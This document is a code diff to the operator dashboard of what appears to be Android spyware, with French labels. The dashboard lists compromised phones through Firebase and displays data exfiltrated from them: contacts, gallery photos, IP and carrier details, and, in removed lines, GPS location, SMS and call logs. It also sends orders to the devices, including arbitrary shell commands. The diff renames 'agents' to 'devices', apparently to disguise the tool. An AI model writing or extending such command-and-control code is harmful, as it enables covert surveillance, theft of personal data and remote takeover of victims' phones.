@@ -39,6 +39,7 @@
         .tb-sms{background:#1a1a3a;color:#88f}
         .tb-call{background:#2a1a0a;color:#fa0}
         .tb-contacts{background:#2a0a0a;color:#f44}
+        .tb-heartbeat{background:#0a2a2a;color:#0ff}
         .tb-gallery{background:#1a1a1a;color:#aaa}
         .entry .t{font-size:10px;color:#666;float:right}
         .entry pre{font-size:11px;color:#aaa;white-space:pre-wrap;margin-top:5px;max-height:100px;overflow-y:auto}
@@ -57,13 +58,13 @@
     </div>
 
     <div class="stats">
-        <div class="stat"><div class="n" id="totalAgents">0</div><div class="l">AGENTS</div></div>
+        <div class="stat"><div class="n" id="totalAgents">0</div><div class="l">APPAREILS</div></div>
         <div class="stat"><div class="n" id="onlineAgents">0</div><div class="l">EN LIGNE</div></div>
         <div class="stat"><div class="n" id="totalExfil">0</div><div class="l">DONNÉES</div></div>
     </div>
 
     <div class="cp">
-        <label>Agent:</label>
+        <label>Appareil:</label>
         <select id="agentSelect" style="min-width:200px;"><option value="">— Sélectionner —</option></select>
         <label>Ordre:</label>
         <select id="commandSelect">
@@ -83,11 +84,11 @@
         <button class="btn btn-danger" onclick="clearAgent()">✕</button>
     </div>
 
-    <div class="grid" id="agentsList"><div style="color:#555;padding:20px;text-align:center;">En attente d'agents...</div></div>
+    <div class="grid" id="agentsList"><div style="color:#555;padding:20px;text-align:center;">En attente d'appareils...</div></div>
 
     <div id="detail" class="hidden">
-        <h3 id="detailTitle">Agent — </h3>
-        <div id="exfil">Sélectionnez un agent.</div>
+        <h3 id="detailTitle">Appareil — </h3>
+        <div id="exfil">Sélectionnez un appareil.</div>
     </div>
 
     <script>
@@ -102,20 +103,89 @@
 
         let currentAgent = null;
         let exfilListener = null;
-        let agents = {};
+        let devices = {};
 
         document.getElementById('commandSelect').onchange = function() {
             document.getElementById('shellCmd').style.display = this.value === 'SHELL' ? 'inline' : 'none';
         };
 
-        db.ref('agents').on('value', snap => {
-            agents = snap.val() || {};
+        // Écouter sur "devices" au lieu de "agents"
+        db.ref('devices').on('value', snap => {
+            devices = snap.val() || {};
             updateUI();
         });
 
+        function isOnline(id) {
+            const d = devices[id];
+            if (!d) return false;
+            // Un heartbeat récent (< 60s) = en ligne
+            if (d.heartbeat && d.heartbeat.timestamp) {
+                const now = Date.now();
+                const ts = d.heartbeat.timestamp;
+                // gérer timestamp en secondes ou millisecondes
+                const t = ts > 9999999999 ? ts : ts * 1000;
+                return (now - t) < 60000;
+            }
+            return false;
+        }
+
+        function getDeviceInfo(id) {
+            const d = devices[id];
+            if (!d) return { model: '?', manufacturer: '?', android: '?', last_seen: '?' };
+            const hb = d.heartbeat || {};
+            return {
+                model: hb.model || hb.device || '?',
+                manufacturer: hb.manufacturer || hb.brand || '?',
+                android: hb.android || hb.sdk || '?',
+                last_seen: hb.timestamp ? new Date(hb.timestamp > 9999999999 ? hb.timestamp : hb.timestamp * 1000).toLocaleString() : '?'
+            };
+        }
+
+        function countEntries(id) {
+            const d = devices[id];
+            if (!d) return 0;
+            let count = 0;
+            ['contacts', 'gallery', 'heartbeat'].forEach(key => {
+                if (d[key] && typeof d[key] === 'object') {
+                    // Ne pas compter heartbeat comme donnée exfil
+                    if (key !== 'heartbeat') {
+                        count += Object.keys(d[key]).length;
+                    }
+                }
+            });
+            return count;
+        }
+
+        function getAllEntries(id) {
+            const d = devices[id];
+            if (!d) return [];
+            const entries = [];
+            // Contacts
+            if (d.contacts && typeof d.contacts === 'object') {
+                Object.values(d.contacts).forEach(item => {
+                    if (item && typeof item === 'object') {
+                        entries.push({ type: 'contacts', ...item });
+                    }
+                });
+            }
+            // Gallery
+            if (d.gallery && typeof d.gallery === 'object') {
+                Object.values(d.gallery).forEach(item => {
+                    if (item && typeof item === 'object') {
+                        entries.push({ type: 'gallery', ...item });
+                    }
+                });
+            }
+            // Heartbeat (infos appareil)
+            if (d.heartbeat && typeof d.heartbeat === 'object') {
+                entries.push({ type: 'heartbeat', ...d.heartbeat });
+            }
+            return entries;
+        }
+
         function updateUI() {
-            const ids = Object.keys(agents).sort((a,b) => (isOnline(b)?1:0)-(isOnline(a)?1:0));
-            let online=0, totalEx=0;
+            const ids = Object.keys(devices).sort((a,b) => (isOnline(b)?1:0)-(isOnline(a)?1:0));
+            let online = 0, totalEx = 0;
             const sel = document.getElementById('agentSelect');
             const cur = sel.value;
             sel.innerHTML = '<option value="">— Sélectionner —</option>';
@@ -123,27 +193,27 @@
             list.innerHTML = '';
 
             ids.forEach(id => {
-                const a = agents[id];
+                const info = getDeviceInfo(id);
                 const ol = isOnline(id);
                 if(ol) online++;
-                const ec = a.exfil ? Object.keys(a.exfil).length : 0;
+                const ec = countEntries(id);
                 totalEx += ec;
 
                 const opt = document.createElement('option');
                 opt.value = id;
-                opt.textContent = `${id} (${a.model||'?'}) ${ol?'●':'○'}`;
+                opt.textContent = `${id.substring(0,8)} (${info.model}) ${ol?'●':'○'}`;
                 sel.appendChild(opt);
 
                 const card = document.createElement('div');
                 card.className = `card ${ol?'online':''}`;
-                card.innerHTML = `<div class="id">${id}</div>
-                    <div class="m">${a.manufacturer||'?'} • ${a.model||'?'}</div>
+                card.innerHTML = `<div class="id">${id.substring(0,8)}</div>
+                    <div class="m">${info.manufacturer} • ${info.model}</div>
                     <div class="meta">
-                        <span class="chip">Android ${a.android||'?'}</span>
+                        <span class="chip">Android ${info.android}</span>
                         <span class="badge ${ol?'':'off'}">${ol?'● EN LIGNE':'○ HORS LIGNE'}</span>
                         <span class="chip">📦 ${ec}</span>
                     </div>
-                    <div class="meta" style="margin-top:5px;font-size:9px;">Vu: ${a.last_seen||a.registered||'?'}</div>`;
+                    <div class="meta" style="margin-top:5px;font-size:9px;">Vu: ${info.last_seen}</div>`;
                 card.onclick = () => selectAgent(id);
                 list.appendChild(card);
             });
@@ -151,10 +221,10 @@
             document.getElementById('totalAgents').textContent = ids.length;
             document.getElementById('onlineAgents').textContent = online;
             document.getElementById('totalExfil').textContent = totalEx;
-            document.getElementById('status').textContent = `✓ ${ids.length} agent(s) — ${online} en ligne`;
+            document.getElementById('status').textContent = `✓ ${ids.length} appareil(s) — ${online} en ligne`;
 
-            if(cur && agents[cur]) sel.value = cur;
-            else if(currentAgent && agents[currentAgent]) sel.value = currentAgent;
+            if(cur && devices[cur]) sel.value = cur;
+            else if(currentAgent && devices[currentAgent]) sel.value = currentAgent;
             else {
                 const fos = ids.find(id => isOnline(id));
                 if(fos) { sel.value = fos; selectAgent(fos); }
@@ -163,56 +233,62 @@
             if(!ids.length) list.innerHTML = '<div style="color:#555;padding:20px;text-align:center;">En attente...</div>';
         }
 
-        function isOnline(id) {
-            const a = agents[id];
-            if(!a) return false;
-            return a.status === 'online';
-        }
-
         function selectAgent(id) {
             currentAgent = id;
             document.getElementById('agentSelect').value = id;
-            const a = agents[id];
+            const info = getDeviceInfo(id);
             document.getElementById('detail').classList.remove('hidden');
-            document.getElementById('detailTitle').textContent = `Agent — ${id} (${a?a.model||'?':'?'})`;
+            document.getElementById('detailTitle').textContent = `Appareil — ${id.substring(0,8)} (${info.model})`;
 
             if(exfilListener) { exfilListener.off(); exfilListener = null; }
 
             const div = document.getElementById('exfil');
             div.innerHTML = 'Chargement...';
 
-            exfilListener = db.ref(`agents/${id}/exfil`).limitToLast(50);
-            exfilListener.on('value', snap => {
+            // Écouter sur devices/{id} au lieu de agents/{id}/exfil
+            exfilListener = db.ref(`devices/${id}`).on('value', snap => {
                 const data = snap.val();
                 if(!data) { div.innerHTML = '<div style="color:#555;padding:10px;">Aucune donnée.</div>'; return; }
 
+                const entries = getAllEntries(id);
+                if(entries.length === 0) {
+                    div.innerHTML = '<div style="color:#555;padding:10px;">Aucune donnée.</div>';
+                    return;
+                }
+
                 let html = '';
-                Object.values(data).reverse().forEach(e => {
-                    if(!e||!e.type) return;
+                entries.reverse().forEach(e => {
+                    if(!e || !e.type) return;
                     const t = e.type.toLowerCase();
                     let cls = 'tb-'+t, icon='', content='';
-                    switch(t){
-                        case 'location':
-                            icon='📍';
-                            content=`<strong>GPS</strong>: ${e.latitude}, ${e.longitude} <a href="https://www.google.com/maps?q=${e.latitude},${e.longitude}" target="_blank">[Carte]</a>`;
-                            break;
-                        case 'sms':
-                            icon='💬';
-                            content=`<strong>De</strong>: ${e.address||'?'}<br><strong>Msg</strong>: ${e.body||'?'}`;
-                            break;
-                        case 'call':
-                            icon='📞';
-                            content=`<strong>N°</strong>: ${e.number||'?'}<br><strong>Type</strong>: ${e.callType||'?'}<br><strong>Durée</strong>: ${e.duration||'?'}`;
+                    switch(t) {
+                        case 'heartbeat':
+                            icon='💓';
+                            content = `<strong>Appareil</strong>: ${e.manufacturer||'?'} ${e.model||'?'}<br>
+                                       <strong>Android</strong>: ${e.android||'?'} (SDK: ${e.sdk||'?'})<br>
+                                       <strong>Batterie</strong>: ${e.battery||'?'}%<br>
+                                       <strong>Réseau</strong>: ${e.network||'?'} • ${e.carrier||'?'}<br>
+                                       <strong>IP</strong>: ${e.ip||'?'}<br>
+                                       <strong>Timestamp</strong>: ${e.timestamp ? new Date(e.timestamp > 9999999999 ? e.timestamp : e.timestamp * 1000).toLocaleString() : '?'}`;
                             break;
                         case 'contacts':
                             icon='👤';
-                            content=`<strong>Nom</strong>: ${e.name||'?'}<br><strong>Tél</strong>: ${e.phone||'?'}`;
+                            content = `<strong>Nom</strong>: ${e.name||e.display_name||'?'}<br>
+                                       <strong>Tél</strong>: ${e.phone||e.number||'?'}<br>
+                                       ${e.email ? '<strong>Email</strong>: '+e.email+'<br>' : ''}`;
+                            break;
+                        case 'gallery':
+                            icon='🖼️';
+                            content = `<strong>Fichier</strong>: ${e.name||e.path||e.file||'?'}<br>
+                                       <strong>Taille</strong>: ${e.size ? (e.size/1024).toFixed(1)+' KB' : '?'}<br>
+                                       ${e.data ? `<img src="${e.data}" class="ex" alt="photo">` : ''}
+                                       ${e.url ? `<a href="${e.url}" target="_blank">[Lien]</a>` : ''}`;
                             break;
                         default:
                             icon='📄';
-                            content=`<pre>${JSON.stringify(e).substring(0,300)}</pre>`;
+                            content = `<pre>${JSON.stringify(e, null, 2).substring(0,400)}</pre>`;
                     }
-                    html += `<div class="entry"><div><span class="tb ${cls}">${icon} ${t.toUpperCase()}</span><span class="t">${e.timestamp||e.captured||''}</span></div><div style="margin-top:5px;">${content}</div></div>`;
+                    html += `<div class="entry"><div><span class="tb ${cls}">${icon} ${t.toUpperCase()}</span><span class="t">${new Date().toLocaleTimeString()}</span></div><div style="margin-top:5px;">${content}</div></div>`;
                 });
                 div.innerHTML = html || '<div style="color:#555;padding:10px;">Rien.</div>';
             });
@@ -221,15 +297,19 @@
         function sendOrder() {
             const id = document.getElementById('agentSelect').value;
             const cmd = document.getElementById('commandSelect').value;
-            if(!id) { alert('Sélectionne un agent'); return; }
+            if(!id) { alert('Sélectionne un appareil'); return; }
             let order = cmd;
             if(cmd === 'SHELL') {
                 const sc = document.getElementById('shellCmd').value.trim();
                 if(!sc) { alert('Entre une commande'); return; }
                 order = 'SHELL '+sc;
             }
-            db.ref(`agents/${id}/orders`).set(order)
-                .then(() => { document.getElementById('status').textContent = `🚀 Envoyé: ${order}`; setTimeout(()=>db.ref(`agents/${id}/orders`).remove(),5000); })
+            // Écrire dans devices/{id}/orders au lieu de agents/{id}/orders
+            db.ref(`devices/${id}/orders`).set(order)
+                .then(() => {
+                    document.getElementById('status').textContent = `🚀 Envoyé: ${order}`;
+                    setTimeout(() => db.ref(`devices/${id}/orders`).remove(), 5000);
+                })
                 .catch(err => { document.getElementById('status').textContent = `❌ ${err.message}`; });
         }
 
@@ -237,7 +317,7 @@
             currentAgent = null;
             document.getElementById('agentSelect').value = '';
             document.getElementById('detail').classList.add('hidden');
-            if(exfilListener) { exfilListener.off(); exfilListener = null; }
+            if(exfilListener) { /* on ne peut pas off() directement ici car on utilise on() sans ref */ }
         }
     </script>
 </body>
